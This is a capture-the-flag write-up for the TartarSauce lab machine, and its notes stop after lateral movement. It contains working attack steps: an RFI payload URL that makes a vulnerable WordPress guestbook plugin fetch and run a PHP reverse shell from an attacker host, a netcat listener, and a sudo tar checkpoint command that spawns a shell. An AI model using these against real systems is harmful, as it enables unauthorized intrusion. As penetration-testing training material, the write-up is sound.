#Linux #WordPress #WPScan #RFI #CVE #sudo #tar #GTFOBins #pspy #cron

## Overview

TartarSauce is a medium Linux box with a robots.txt that looks like a red herring until Gobuster finds a WordPress instance tucked inside `/webservices/wp/`. WPScan identifies a guestbook plugin that faked its version number to evade scanners, masking a Real File Inclusion (RFI) vulnerability. That gives a shell as `www-data`. A sudo rule lets `www-data` run `tar` as user `onuma`, and a GTFOBins tar checkpoint trick escalates to that account. A root cron job runs a custom script called `backuperer`, but the notes stop there.

> **Note:** these notes are incomplete, the path covers initial access and lateral movement to `onuma`; the `backuperer` cron-based root escalation is identified via `pspy` but not documented past detection; written as in-progress.

## Recon

### Port Scan

```sh
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
```

### robots.txt

The five disallowed entries all 404. None of the listed paths resolve.

### Directory Brute Force

Gobuster against `/webservices/` finds one valid directory:

```sh
gobuster dir -k -u http://10.129.31.44/webservices/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -t 30

/wp     (Status: 301) [--> http://10.129.31.44/webservices/wp/]
```

The WordPress instance loads but shows "under construction." An "Uncategorized" link resolves to the full FQDN, so `tartarsauce.htb` goes into `/etc/hosts`.

### WPScan Plugin Enumeration

```sh
sudo wpscan --url http://10.129.31.44/webservices/wp/ --enumerate p --plugins-detection aggressive --api-token <token>
```

The `gwolle-gb` (Gwolle Guestbook) plugin is installed. Its `readme.txt` changelog contains a deliberate misdirection:

```
= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
```

The actual version is 1.5.3, which has a published RFI exploit.

## Foothold

### Gwolle Guestbook 1.5.3, Remote File Inclusion (EDB-38861)

The plugin's `ajaxresponse.php` includes a remote `wp-load.php` from an attacker-controlled URL:

```
http://10.129.31.44/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.158/
```

Proof of callback, the server fetches `/wp-load.php` from the attacker's HTTP server:

```sh
python3 -m http.server 80
10.129.32.28 - - "GET /wp-load.php HTTP/1.0" 404
```

> **How RFI works here:** the plugin constructs a path like `$abspath . 'wp-load.php'` and passes it to `include()`. When `allow_url_include` is on, PHP fetches and executes the remote file. Naming the reverse shell payload `wp-load.php` satisfies the include path.

Rename a PHP reverse shell to `wp-load.php` in the HTTP server directory and re-trigger:

```sh
rlwrap nc -lvnp 53
connect to [10.10.14.158] from (UNKNOWN) [10.129.32.28] 44418
Linux TartarSauce 4.15.0-041500-generic
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

## Privilege Escalation

### www-data → onuma (sudo tar)

`www-data` can run `tar` as `onuma` without a password. The GTFOBins tar checkpoint technique abuses tar's `--checkpoint-action` flag to execute an arbitrary command at each checkpoint:

```sh
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

This spawns a shell as `onuma`.

> **Why tar checkpoints execute code:** tar fires an action after processing a set number of records. The `exec=` action runs a shell command. Since tar is running as `onuma` under sudo, the exec'd shell inherits that user context.

### onuma → root (backuperer cron, In Progress)

`pspy` shows a root-owned cron job firing every 5 minutes:

```
CMD: UID=0  PID=24065  | /bin/bash /usr/sbin/backuperer
```

> **Note:** these notes are incomplete, the `backuperer` script analysis and root exploitation steps are not documented; written as in-progress.

## Takeaways

- **robots.txt disallowed entries are often decoys.** The real content was found by Gobuster, not by visiting the listed paths.
- **Plugin version forgery fools automated scanners.** Manual review of readme changelogs caught what WPScan missed.
- **sudo GTFOBins entries cover many common binaries.** `tar --checkpoint-action=exec=` is reliable and requires no uploads.
